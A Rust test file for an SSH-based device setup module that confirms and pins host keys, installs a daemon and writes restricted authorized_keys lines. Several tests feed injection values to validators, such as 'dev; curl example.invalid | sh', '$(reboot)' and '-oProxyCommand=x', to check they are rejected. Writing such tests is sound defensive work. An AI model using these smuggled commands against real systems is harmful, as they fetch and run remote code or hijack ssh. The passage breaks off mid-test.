// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Max Boksem

use std::sync::Arc;

use super::*;

const PUBLIC: &str =
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeFakeFakeFakeFakeFakeFakeFakeFakeFake maxhq@mac\n";
const KEY: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHostHostHostHostHostHostHostHostHostHost";

/// One command the fake ran.
#[derive(Debug, Clone)]
struct Ran {
    program: String,
    args: Vec<String>,
    stdin: Option<Vec<u8>>,
}

/// A machine with ssh that knows `devbox`'s key or not, and a device that
/// answers the probe.
struct Fake {
    known: bool,
    probe: String,
    /// More lines `ssh -G` prints.
    config: String,
    /// What ssh keeps from a host it hasn't met.
    met: String,
    /// Whether the device runs `sh`.
    sh: bool,
    /// What the PowerShell probe prints, on a Windows PC.
    windows: Option<String>,
    ran: Mutex<Vec<Ran>>,
}

impl Fake {
    fn new(known: bool) -> Self {
        Self {
            known,
            probe: "uname=Linux x86_64\nhome=/home/dev\nuser=dev\nsystemd=yes\nlinger=no\n".into(),
            config: String::new(),
            met: format!("devbox {KEY}\n"),
            sh: true,
            windows: None,
            ran: Mutex::new(Vec::new()),
        }
    }

    /// A Windows PC whose OpenSSH Server starts commands through cmd.
    fn windows(known: bool) -> Self {
        Self {
            sh: false,
            windows: Some(WINDOWS_PROBE.into()),
            ..Self::new(known)
        }
    }

    fn ran(&self) -> Vec<Ran> {
        self.ran.lock().unwrap().clone()
    }

    /// The ssh runs that reach the device, leaving out `ssh -G`.
    fn ssh(&self) -> Vec<Ran> {
        self.ran()
            .into_iter()
            .filter(|ran| ran.program == "ssh" && ran.args.first().is_none_or(|arg| arg != "-G"))
            .collect()
    }

    /// The PowerShell scripts the remote commands ran, decoded.
    fn scripts(&self) -> Vec<String> {
        self.remote()
            .iter()
            .filter_map(|command| script_of(command))
            .collect()
    }

    /// The remote commands, after the host.
    fn remote(&self) -> Vec<String> {
        self.ssh()
            .into_iter()
            .filter_map(|ran| {
                let at = ran.args.iter().position(|arg| arg == "devbox")?;
                Some(ran.args[at + 1..].join(" "))
            })
            .collect()
    }
}

impl Run for Fake {
    async fn run(
        &self,
        program: &str,
        args: Vec<String>,
        stdin: Option<Vec<u8>>,
    ) -> io::Result<Output> {
        self.ran.lock().unwrap().push(Ran {
            program: program.to_owned(),
            args: args.clone(),
            stdin: stdin.clone(),
        });
        let ok = |stdout: &str| {
            Ok(Output {
                ok: true,
                stdout: stdout.to_owned(),
                stderr: String::new(),
            })
        };
        match (program, args.first().map(String::as_str)) {
            ("ssh", Some("-G")) => ok(&format!(
                "hostname devbox\nport 22\nuserknownhostsfile /home/dev/.ssh/known_hosts\n{}",
                self.config
            )),
            ("ssh-keygen", Some("-F")) if self.known && args[1] == "devbox" => {
                ok(&format!("# Host devbox found: line 3\ndevbox {KEY}\n"))
            }
            ("ssh-keygen", Some("-F")) => Ok(Output::default()),
            ("ssh-keygen", Some("-l")) => {
                let keys = std::fs::read_to_string(&args[2]).unwrap().lines().count();
                ok(&"256 SHA256:abcdef devbox (ED25519)\n".repeat(keys))
            }
            ("ssh", _) if args.iter().any(|a| a == "StrictHostKeyChecking=accept-new") => {
                let file = args
                    .iter()
                    .find_map(|a| a.strip_prefix("UserKnownHostsFile="))
                    .unwrap();
                std::fs::write(file, &self.met).unwrap();
                ok("")
            }
            ("ssh", _) if args.iter().any(|a| a == "sh -s") && !self.sh => Ok(Output {
                ok: false,
                stdout: String::new(),
                stderr: "'sh' is not recognized as an internal or external command".into(),
            }),
            ("ssh", _) if args.iter().any(|a| a == "sh -s") => ok(&self.probe),
            ("ssh", _) if args.iter().any(|a| script_of(a).is_some()) => {
                let Some(probe) = &self.windows else {
                    return Ok(Output {
                        ok: false,
                        stdout: String::new(),
                        stderr: "sh: 1: powershell: not found".into(),
                    });
                };
                match args
                    .iter()
                    .any(|a| script_of(a).as_deref() == Some(windows::PROBE))
                {
                    true => ok(probe),
                    false => ok(""),
                }
            }
            ("ssh", _) => ok(""),
            _ => Err(io::Error::other("unexpected program")),
        }
    }
}

/// What the PowerShell probe prints on a Windows PC.
const WINDOWS_PROBE: &str = "os=Windows_NT\narch=AMD64\nhome=C:\\Users\\dev\n\
     local=C:\\Users\\dev\\AppData\\Local\nuser=dev\nadmin=no\nshell=\n";

/// The PowerShell command starts with.
const POWERSHELL: &str = "powershell -NoProfile -NonInteractive -EncodedCommand ";

/// The script a remote PowerShell command runs, decoded from its base64
/// UTF-16LE.
fn script_of(command: &str) -> Option<String> {
    use base64::Engine;
    let encoded = command.strip_prefix(POWERSHELL)?;
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .ok()?;
    let units: Vec<u16> = bytes
        .as_chunks::<2>()
        .0
        .iter()
        .map(|pair| u16::from_le_bytes(*pair))
        .collect();
    String::from_utf16(&units).ok()
}

fn temp_paths() -> SetupPaths {
    let dir = std::env::temp_dir().join(format!("maxhq-setup-{}", fastrand::u64(..)));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("id_ed25519.pub"), PUBLIC).unwrap();
    let binary = dir.join("maxd-x86_64-unknown-linux-musl");
    std::fs::write(&binary, b"maxd").unwrap();
    SetupPaths {
        key: dir.join("id_ed25519"),
        known_hosts: dir.join("known_hosts"),
        scratch: dir.join("setup"),
    }
}

fn binary(paths: &SetupPaths) -> impl Fn(&str) -> Option<SetupBinary> {
    let path = paths.key.with_file_name("maxd-x86_64-unknown-linux-musl");
    move |target| {
        (target == "x86_64-unknown-linux-musl").then(|| SetupBinary {
            path: path.clone(),
            sha256: "ab".repeat(32),
        })
    }
}

/// The `maxd.exe` for a Windows PC on x86_64, and nothing else.
fn windows_binary(paths: &SetupPaths) -> impl Fn(&str) -> Option<SetupBinary> {
    let path = paths.key.with_file_name("maxd-x86_64-unknown-linux-musl");
    move |target| {
        (target == "x86_64-pc-windows-msvc").then(|| SetupBinary {
            path: path.clone(),
            sha256: "cd".repeat(32),
        })
    }
}

fn collect() -> (Arc<Mutex<Vec<Step>>>, impl Fn(Step) + Sync) {
    let steps = Arc::new(Mutex::new(Vec::new()));
    let sink = Arc::clone(&steps);
    (steps, move |step| sink.lock().unwrap().push(step))
}

#[tokio::test]
async fn nothing_runs_on_the_device_before_you_confirm_a_new_host_key() {
    let paths = temp_paths();
    let fake = Fake::new(false);
    let confirms = Confirmations::default();
    let (steps, step) = collect();
    let setup = Setup::new(&fake, &paths, "devbox").unwrap();
    let round = setup.prepare(binary(&paths), &confirms, &step);
    tokio::pin!(round);
    // Run until it asks.
    loop {
        tokio::select! {
            _ = &mut round => panic!("it finished without asking"),
            () = tokio::task::yield_now() => {}
        }
        if steps
            .lock()
            .unwrap()
            .iter()
            .any(|s| matches!(s, Step::ConfirmHostKey { .. }))
        {
            break;
        }
    }
    // Only the key check and the key scan ran, and the scan ran `true`.
    assert_eq!(fake.remote(), ["true"]);
    let Some(Step::ConfirmHostKey { id, fingerprints }) = steps.lock().unwrap().last().cloned()
    else {
        panic!("no question");
    };
    assert_eq!(fingerprints, ["256 SHA256:abcdef devbox (ED25519)"]);
    assert!(confirms.answer(id, false));
    let error = round.await.unwrap_err();
    assert_eq!(
        error.0,
        "The host key wasn't confirmed. MaxHQ contacted the host to read its key and went no further"
    );
    assert_eq!(fake.remote(), ["true"]);
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn reading_a_new_host_key_offers_no_login_and_forwards_nothing() {
    let paths = temp_paths();
    let fake = Fake::new(false);
    let confirms = Arc::new(Confirmations::default());
    let answers = Arc::clone(&confirms);
    let step = move |step: Step| {
        if let Step::ConfirmHostKey { id, .. } = step {
            answers.answer(id, false);
        }
    };
    let setup = Setup::new(&fake, &paths, "devbox").unwrap();
    assert!(setup
        .prepare(binary(&paths), &confirms, &step)
        .await
        .is_err());
    let ssh = fake.ssh();
    let [probe] = &ssh[..] else {
        panic!("one ssh, the one that reads the key: {ssh:?}");
    };
    let host = probe.args.iter().position(|arg| arg == "--").unwrap();
    for option in [
        "PreferredAuthentications=none",
        "ForwardAgent=no",
        "ForwardX11=no",
        "ClearAllForwardings=yes",
        "PermitLocalCommand=no",
    ] {
        // ssh keeps the first value it reads, so these come before the host.
        let at = probe.args[..host].iter().position(|arg| arg == option);
        let at = at.unwrap_or_else(|| panic!("no {option}"));
        assert_eq!(probe.args[at - 1], "-o");
    }
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_confirmed_key_is_the_only_one_later_steps_trust() {
    let paths = temp_paths();
    let fake = Fake::new(false);
    let confirms = Arc::new(Confirmations::default());
    let answers = Arc::clone(&confirms);
    let step = move |step: Step| {
        if let Step::ConfirmHostKey { id, .. } = step {
            answers.answer(id, true);
        }
    };
    let prepared = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert_eq!(prepared.host_keys, [KEY]);
    for ran in fake.ssh().iter().skip(1) {
        assert!(ran.args.contains(&"StrictHostKeyChecking=yes".to_owned()));
        assert!(ran
            .args
            .iter()
            .any(|a| a.starts_with("UserKnownHostsFile=")));
    }
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn only_the_key_you_were_shown_is_kept_and_trusted() {
    let paths = temp_paths();
    let mut fake = Fake::new(false);
    fake.met = format!("devbox {KEY}\ndevbox ssh-rsa AAAAnever-shown\n");
    let confirms = Arc::new(Confirmations::default());
    let answers = Arc::clone(&confirms);
    let shown = Arc::new(Mutex::new(Vec::new()));
    let seen = Arc::clone(&shown);
    let step = move |step: Step| {
        if let Step::ConfirmHostKey { id, fingerprints } = step {
            *seen.lock().unwrap() = fingerprints;
            answers.answer(id, true);
        }
    };
    let prepared = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert_eq!(shown.lock().unwrap().len(), 1);
    assert_eq!(prepared.host_keys, [KEY]);
    for ran in fake.ssh().iter().skip(1) {
        let file = ran
            .args
            .iter()
            .find_map(|a| a.strip_prefix("UserKnownHostsFile="))
            .unwrap();
        assert_eq!(
            std::fs::read_to_string(file).unwrap(),
            format!("devbox {KEY}\n")
        );
    }
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn keys_count_as_confirmed_only_when_you_vouched_for_them() {
    async fn confirmed(fake: &Fake) -> bool {
        let paths = temp_paths();
        let confirms = Arc::new(Confirmations::default());
        let answers = Arc::clone(&confirms);
        let step = move |step: Step| {
            if let Step::ConfirmHostKey { id, .. } = step {
                answers.answer(id, true);
            }
        };
        let prepared = Setup::new(fake, &paths, "devbox")
            .unwrap()
            .prepare(binary(&paths), &confirms, &step)
            .await
            .unwrap();
        let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
        prepared.host_keys_confirmed
    }

    assert!(
        confirmed(&Fake::new(false)).await,
        "you said yes to it here"
    );
    assert!(confirmed(&Fake::new(true)).await, "ssh asks by default");
    let mut fake = Fake::new(true);
    fake.config = "stricthostkeychecking true\n".into();
    assert!(confirmed(&fake).await, "ssh only takes keys you added");
    for unasked in ["accept-new", "false"] {
        let mut fake = Fake::new(true);
        fake.config = format!("stricthostkeychecking {unasked}\n");
        assert!(!confirmed(&fake).await, "ssh keeps keys unasked: {unasked}");
    }
}

#[tokio::test]
async fn a_known_host_installs_maxd_adds_the_key_and_hints_at_linger() {
    let paths = temp_paths();
    let fake = Fake::new(true);
    let confirms = Confirmations::default();
    let (steps, step) = collect();
    let prepared = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert_eq!(
        prepared,
        Prepared {
            host: "devbox".into(),
            home: "/home/dev".into(),
            target: "x86_64-unknown-linux-musl".into(),
            host_keys: vec![KEY.into()],
            host_keys_confirmed: true,
            linger: false,
        }
    );
    let line = "restrict,command=\"/home/dev/.local/bin/maxd proxy\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeFakeFakeFakeFakeFakeFakeFakeFakeFake maxhq";
    let steps = steps.lock().unwrap().clone();
    assert_eq!(
        steps,
        [
            Step::HostKey,
            Step::Probe,
            Step::Install,
            Step::Linger {
                command: "sudo loginctl enable-linger dev".into()
            },
            Step::Key { line: line.into() },
        ]
    );
    let remote = fake.remote();
    assert_eq!(remote.len(), 4, "{remote:?}");
    assert_eq!(remote[0], "sh -s");
    assert!(remote[1].starts_with("sh -c 'set -eu"));
    assert!(remote[1].ends_with(&format!(
        " maxhq '{}' '{}' '{MAXD_LINK_TEMP}'",
        "ab".repeat(32),
        "ab".repeat(8)
    )));
    assert_eq!(
        remote[2],
        "sh -c '\"$HOME/.local/bin/maxd\" service install' maxhq"
    );
    // The installed maxd writes the line from the bare public key.
    assert!(remote[3].ends_with(
        " maxhq 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeFakeFakeFakeFakeFakeFakeFakeFakeFake'"
    ));
    // The binary goes over stdin, never in an argument.
    let upload = fake
        .ran()
        .into_iter()
        .find(|r| r.args.iter().any(|a| a.contains("versions")))
        .unwrap();
    assert_eq!(upload.stdin.as_deref(), Some(&b"maxd"[..]));
    // sudo is only shown, never run.
    assert!(fake
        .ran()
        .iter()
        .all(|r| !r.args.iter().any(|a| a.contains("sudo"))));
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn the_app_key_goes_beside_the_ssh_key() {
    let paths = temp_paths();
    let fake = Fake::new(true);
    let confirms = Confirmations::default();
    let (_, step) = collect();
    let app_key = "B9sIh0gqNw8gm2y_XxV-Fa0e1lJ5nXcZ2rVf3pQb2kA";
    Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .with_app_key(app_key, "MaxHQ on the team's\nMac")
        .unwrap()
        .prepare(binary(&paths), &confirms, &step)
        .await
        .unwrap();
    let remote = fake.remote();
    assert_eq!(remote.len(), 4, "{remote:?}");
    // The label loses what would end its quotes or its line.
    assert_eq!(
        remote[3],
        format!(
            "sh -c '{ADD_KEYS}' maxhq 'ssh-ed25519 \
             AAAAC3NzaC1lZDI1NTE5AAAAIFakeFakeFakeFakeFakeFakeFakeFakeFakeFake' '{app_key}' \
             'MaxHQ on the team\u{2019}s Mac'"
        )
    );
    // Anything but base64url never reaches the device's shell.
    for bad in ["", "a'b", "a b", "a$(reboot)", "a/b"] {
        let setup = Setup::new(&fake, &paths, "devbox").unwrap();
        assert!(setup.with_app_key(bad, "MaxHQ").is_err(), "{bad:?}");
    }
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_login_and_host_finds_the_key_your_known_hosts_has() {
    let paths = temp_paths();
    let fake = Fake::new(true);
    let confirms = Confirmations::default();
    let (steps, step) = collect();
    let prepared = Setup::new(&fake, &paths, "dev@devbox")
        .unwrap()
        .prepare(binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert_eq!(prepared.host_keys, [KEY]);
    assert!(!steps
        .lock()
        .unwrap()
        .iter()
        .any(|s| matches!(s, Step::ConfirmHostKey { .. })));
    // It looks the host up as ssh resolves it, never as typed.
    let lookups: Vec<Vec<String>> = fake
        .ran()
        .into_iter()
        .filter(|r| r.program == "ssh-keygen")
        .map(|r| r.args)
        .collect();
    assert_eq!(
        lookups,
        [["-F", "devbox", "-f", "/home/dev/.ssh/known_hosts"]]
    );
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn the_linger_hint_shows_only_a_plain_user_name() {
    for (user, shown) in [
        ("dev", "dev"),
        ("svc.dev-1_a", "svc.dev-1_a"),
        ("dev; curl example.invalid | sh", "$USER"),
        ("$(reboot)", "$USER"),
        ("`reboot`", "$USER"),
        ("-x", "$USER"),
        ("", "$USER"),
    ] {
        let paths = temp_paths();
        let mut fake = Fake::new(true);
        fake.probe =
            format!("uname=Linux x86_64\nhome=/home/dev\nuser={user}\nsystemd=yes\nlinger=no\n");
        let confirms = Confirmations::default();
        let (steps, step) = collect();
        Setup::new(&fake, &paths, "devbox")
            .unwrap()
            .prepare(binary(&paths), &confirms, &step)
            .await
            .unwrap();
        assert!(
            steps.lock().unwrap().contains(&Step::Linger {
                command: format!("sudo loginctl enable-linger {shown}"),
            }),
            "for {user:?}"
        );
        let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
    }
}

#[tokio::test]
async fn a_device_already_on_the_build_isnt_sent_it_again() {
    let paths = temp_paths();
    let mut fake = Fake::new(true);
    fake.probe
        .push_str(&format!("build={}\nlinger=yes\n", "ab".repeat(8)));
    let confirms = Confirmations::default();
    let (steps, step) = collect();
    let prepared = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert!(prepared.linger);
    assert_eq!(fake.remote().len(), 3);
    assert!(!steps
        .lock()
        .unwrap()
        .iter()
        .any(|s| matches!(s, Step::Linger { .. })));
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[test]
fn the_key_line_is_exact_and_adding_it_is_idempotent() {
    assert_eq!(
        authorized_line("/home/dev", "ssh-ed25519 AAAAkey maxhq@mac").unwrap(),
        "restrict,command=\"/home/dev/.local/bin/maxd proxy\" ssh-ed25519 AAAAkey maxhq"
    );
    assert!(authorized_line("/home/my dev", "ssh-ed25519 AAAAkey").is_err());
    assert!(authorized_line("/home/dev", "ssh-ed25519 AA'AA").is_err());
    assert!(authorized_line("relative", "ssh-ed25519 AAAA").is_err());
    // The installed maxd adds the line, through its own writer.
    assert_eq!(ADD_KEY, r#""$HOME/.local/bin/maxd" authorize-key "$1""#);
    assert_eq!(
        ADD_KEYS,
        r#""$HOME/.local/bin/maxd" authorize-key "$1" --app "$2" "$3""#
    );
    for script in [PROBE, INSTALL, ADD_KEY, ADD_KEYS] {
        assert!(!script.contains('\''));
        assert!(!script.contains("sudo"));
    }
}

#[test]
fn a_host_cant_be_an_option_or_a_shell_word() {
    let paths = temp_paths();
    let fake = Fake::new(true);
    for host in [
        "-oProxyCommand=x",
        "ssh://-oProxyCommand=x",
        "dev box",
        "dev'box",
        "dev$box",
        "dev`box",
        "dev;box",
        "",
    ] {
        assert!(Setup::new(&fake, &paths, host).is_err(), "{host}");
    }
    assert!(Setup::new(&fake, &paths, "dev@devbox").is_ok());
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[test]
fn hosts_come_from_plain_host_lines() {
    let config = "Host devbox buildbox\n  HostName 10.0.0.2\nHost *.internal !bad\nhost   devbox  ws-?\nMatch all\n";
    assert_eq!(config_hosts(config), ["devbox", "buildbox"]);
}

#[test]
fn only_linux_on_two_arches_has_a_target() {
    assert_eq!(
        target_for("Linux x86_64"),
        Some("x86_64-unknown-linux-musl")
    );
    assert_eq!(
        target_for("Linux aarch64"),
        Some("aarch64-unknown-linux-musl")
    );
    assert_eq!(target_for("Darwin arm64"), None);
}

#[test]
fn the_pinned_ed25519_key_is_found_by_device() {
    let paths = temp_paths();
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev1"), None);
    record_host_keys(
        &paths.known_hosts,
        "dev1",
        &["ssh-rsa BBBB".into(), KEY.into()],
    )
    .unwrap();
    assert_eq!(
        pinned_host_key(&paths.known_hosts, "dev1").as_deref(),
        Some(KEY)
    );
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev2"), None);
    assert_eq!(
        kept_host_keys(&paths.known_hosts, "dev1"),
        ["ssh-rsa BBBB", KEY]
    );
    assert!(kept_host_keys(&paths.known_hosts, "dev2").is_empty());
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[test]
fn host_keys_go_under_the_alias_once() {
    let paths = temp_paths();
    record_host_keys(&paths.known_hosts, "dev1", &[KEY.into()]).unwrap();
    record_host_keys(&paths.known_hosts, "dev1", &[KEY.into()]).unwrap();
    assert_eq!(
        std::fs::read_to_string(&paths.known_hosts).unwrap(),
        format!("maxhq-dev-dev1 {KEY}\n")
    );
    assert_eq!(
        key_lines("# comment\n@revoked * ssh-ed25519 AAAA\nhost ssh-rsa BBBB\n"),
        ["ssh-rsa BBBB"]
    );
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[test]
fn a_confirmed_setup_replaces_a_devices_old_keys_and_no_others() {
    let paths = temp_paths();
    let (old, other, new) = ("ssh-ed25519 OLD", "ssh-ed25519 OTHER", "ssh-ed25519 NEW");
    record_host_keys(
        &paths.known_hosts,
        "dev1",
        &[old.into(), "ssh-rsa OLDER".into()],
    )
    .unwrap();
    record_host_keys(&paths.known_hosts, "dev2", &[other.into()]).unwrap();
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev1").unwrap(), old);

    // Adding leaves the old key as the pin, which is why a confirmed setup
    // replaces.
    record_host_keys(&paths.known_hosts, "dev1", &[new.into()]).unwrap();
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev1").unwrap(), old);

    replace_host_keys(&paths.known_hosts, "dev1", &[new.into()]).unwrap();
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev1").unwrap(), new);
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev2").unwrap(), other);
    assert_eq!(
        std::fs::read_to_string(&paths.known_hosts).unwrap(),
        format!("maxhq-dev-dev2 {other}\nmaxhq-dev-dev1 {new}\n")
    );
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[test]
fn a_setup_with_no_ed25519_key_leaves_the_pin() {
    let paths = temp_paths();
    let old = "ssh-ed25519 OLD";
    record_host_keys(&paths.known_hosts, "dev1", &[old.into()]).unwrap();
    replace_host_keys(&paths.known_hosts, "dev1", &["ssh-rsa NEW".into()]).unwrap();
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev1").unwrap(), old);

    // A device with none yet gets its first.
    replace_host_keys(&paths.known_hosts, "dev2", &[old.into()]).unwrap();
    assert_eq!(pinned_host_key(&paths.known_hosts, "dev2").unwrap(), old);
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

/// Your own ssh, for the key lookup: `ssh -G` prints `config`, or fails
/// when it's empty, and `ssh-keygen -F` finds a name in a real file.
struct Lookup {
    config: String,
    ran: Mutex<Vec<String>>,
}

impl Lookup {
    fn new(config: String) -> Self {
        Self {
            config,
            ran: Mutex::new(Vec::new()),
        }
    }

    fn ran(&self) -> Vec<String> {
        self.ran.lock().unwrap().clone()
    }
}

impl Run for Lookup {
    async fn run(
        &self,
        program: &str,
        args: Vec<String>,
        _stdin: Option<Vec<u8>>,
    ) -> io::Result<Output> {
        self.ran
            .lock()
            .unwrap()
            .push(format!("{program} {}", args.join(" ")));
        let args: Vec<&str> = args.iter().map(String::as_str).collect();
        match (program, args.as_slice()) {
            ("ssh", ["-G", ..]) => Ok(Output {
                ok: !self.config.is_empty(),
                stdout: self.config.clone(),
                stderr: String::new(),
            }),
            ("ssh-keygen", ["-F", name, "-f", file]) => {
                let text = std::fs::read_to_string(file).unwrap_or_default();
                let found: Vec<&str> = text
                    .lines()
                    .filter(|line| {
                        line.split_whitespace()
                            .find(|word| !word.starts_with('@'))
                            .is_some_and(|names| names.split(',').any(|n| n == *name))
                    })
                    .collect();
                Ok(Output {
                    ok: !found.is_empty(),
                    stdout: found
                        .iter()
                        .map(|line| format!("# Host {name} found: line 1\n{line}\n"))
                        .collect(),
                    stderr: String::new(),
                })
            }
            _ => Err(io::Error::other("unexpected program")),
        }
    }
}

/// Writes one of your own `known_hosts` files beside MaxHQ's, and gives
/// its path.
fn yours(paths: &SetupPaths, name: &str, text: &str) -> String {
    let file = paths.key.with_file_name(name);
    std::fs::write(&file, text).unwrap();
    file.display().to_string()
}

#[tokio::test]
async fn a_login_and_alias_is_looked_up_under_its_host_name() {
    let paths = temp_paths();
    let file = yours(
        &paths,
        "known_hosts",
        "box ssh-ed25519 AAAAalias\ndevbox.example.ts.net ssh-ed25519 AAAAreal\n",
    );
    let lookup = Lookup::new(format!(
        "user dev\nhostname devbox.example.ts.net\nport 22\nuserknownhostsfile {file}\n"
    ));
    assert_eq!(
        known_host_keys(&lookup, "dev@box").await,
        ["ssh-ed25519 AAAAreal"]
    );
    assert_eq!(lookup.ran()[0], "ssh -G -- dev@box");
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_host_key_alias_is_the_name_looked_up() {
    let paths = temp_paths();
    let file = yours(
        &paths,
        "known_hosts",
        "[10.0.0.5]:2200 ssh-ed25519 AAAAaddress\nbox-key ssh-ed25519 AAAAalias\n",
    );
    let lookup = Lookup::new(format!(
        "hostname 10.0.0.5\nport 2200\nhostkeyalias box-key\nuserknownhostsfile {file}\n"
    ));
    assert_eq!(
        known_host_keys(&lookup, "devbox").await,
        ["ssh-ed25519 AAAAalias"]
    );
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_port_other_than_22_is_looked_up_with_the_host() {
    let paths = temp_paths();
    let file = yours(
        &paths,
        "known_hosts",
        "devbox ssh-ed25519 AAAAplain\n[devbox]:2200 ssh-ed25519 AAAAported\n",
    );
    let lookup = Lookup::new(format!(
        "hostname devbox\nport 2200\nuserknownhostsfile {file}\n"
    ));
    assert_eq!(
        known_host_keys(&lookup, "devbox:2200").await,
        ["ssh-ed25519 AAAAported"]
    );
    assert_eq!(lookup.ran()[0], "ssh -G -p 2200 -- devbox");
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn every_known_hosts_file_ssh_names_is_read() {
    let paths = temp_paths();
    let missing = paths.key.with_file_name("missing").display().to_string();
    let second = yours(&paths, "known_hosts2", "devbox ssh-ed25519 AAAAsecond\n");
    let lookup = Lookup::new(format!(
        "hostname devbox\nport 22\nuserknownhostsfile {missing} {second}\n"
    ));
    assert_eq!(
        known_host_keys(&lookup, "devbox").await,
        ["ssh-ed25519 AAAAsecond"]
    );
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_revoked_key_is_refused_wherever_it_says_so() {
    let paths = temp_paths();
    let (bad, good) = ("ssh-ed25519 AAAAbad", "ssh-ed25519 AAAAgood");
    let lookup = |files: String| Lookup::new(format!("hostname devbox\nport 22\n{files}"));

    let same = yours(
        &paths,
        "same",
        &format!("devbox {bad}\n@revoked devbox {bad}\ndevbox {good}\n"),
    );
    let found = lookup(format!("userknownhostsfile {same}\n"));
    assert_eq!(known_host_keys(&found, "devbox").await, [good]);

    let plain = yours(&paths, "plain", &format!("devbox {bad}\n"));
    let other = yours(&paths, "other", &format!("@revoked devbox {bad}\n"));
    let found = lookup(format!("userknownhostsfile {plain} {other}\n"));
    assert!(known_host_keys(&found, "devbox").await.is_empty());

    let found = lookup(format!(
        "userknownhostsfile {plain}\nglobalknownhostsfile {other}\n"
    ));
    assert!(known_host_keys(&found, "devbox").await.is_empty());

    let device = "dev1";
    let pinned = pin_known_host(&found, &paths.known_hosts, device, "devbox").await;
    assert!(matches!(pinned, Ok(Pinning::Unknown)));
    assert_eq!(pinned_host_key(&paths.known_hosts, device), None);
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn only_your_own_files_give_keys_to_keep() {
    let paths = temp_paths();
    let mine = yours(&paths, "mine", "devbox ssh-ed25519 AAAAmine\n");
    let global = yours(&paths, "global", "devbox ssh-ed25519 AAAAglobal\n");
    let found = Lookup::new(format!(
        "hostname devbox\nport 22\nuserknownhostsfile {mine}\nglobalknownhostsfile {global}\n"
    ));
    assert_eq!(
        known_host_keys(&found, "devbox").await,
        ["ssh-ed25519 AAAAmine"]
    );
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn nothing_is_found_for_a_host_ssh_doesnt_know() {
    let paths = temp_paths();
    let file = yours(&paths, "known_hosts", "other ssh-ed25519 AAAAother\n");
    let lookup = Lookup::new(format!(
        "hostname devbox\nport 22\nuserknownhostsfile {file}\n"
    ));
    assert!(known_host_keys(&lookup, "devbox").await.is_empty());
    // No files to look in, or no answer from ssh, looks nowhere.
    let none = Lookup::new("hostname devbox\nport 22\nuserknownhostsfile none\n".into());
    assert!(known_host_keys(&none, "devbox").await.is_empty());
    assert_eq!(none.ran(), ["ssh -G -- devbox"]);
    let failed = Lookup::new(String::new());
    assert!(known_host_keys(&failed, "devbox").await.is_empty());
    assert_eq!(failed.ran(), ["ssh -G -- devbox"]);
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

/// A lookup of `devbox` in `text`, as your only `known_hosts`.
fn knowing(paths: &SetupPaths, text: &str) -> Lookup {
    let file = yours(paths, "yours", text);
    Lookup::new(format!(
        "hostname devbox\nport 22\nuserknownhostsfile {file}\n"
    ))
}

#[tokio::test]
async fn a_device_with_no_pin_gets_the_ed25519_key_you_know() {
    let paths = temp_paths();
    let lookup = knowing(&paths, &format!("devbox ssh-rsa BBBB\ndevbox {KEY}\n"));
    assert_eq!(
        pin_known_host(&lookup, &paths.known_hosts, "dev1", "devbox")
            .await
            .unwrap(),
        Pinning::Pinned
    );
    assert_eq!(
        std::fs::read_to_string(&paths.known_hosts).unwrap(),
        format!("maxhq-dev-dev1 {KEY}\n")
    );
    // Looking again keeps the one pin.
    assert_eq!(
        pin_known_host(&lookup, &paths.known_hosts, "dev1", "devbox")
            .await
            .unwrap(),
        Pinning::Kept
    );
    assert_eq!(
        std::fs::read_to_string(&paths.known_hosts).unwrap(),
        format!("maxhq-dev-dev1 {KEY}\n")
    );
    // It only resolves and looks up. It never asks the host.
    assert!(lookup
        .ran()
        .iter()
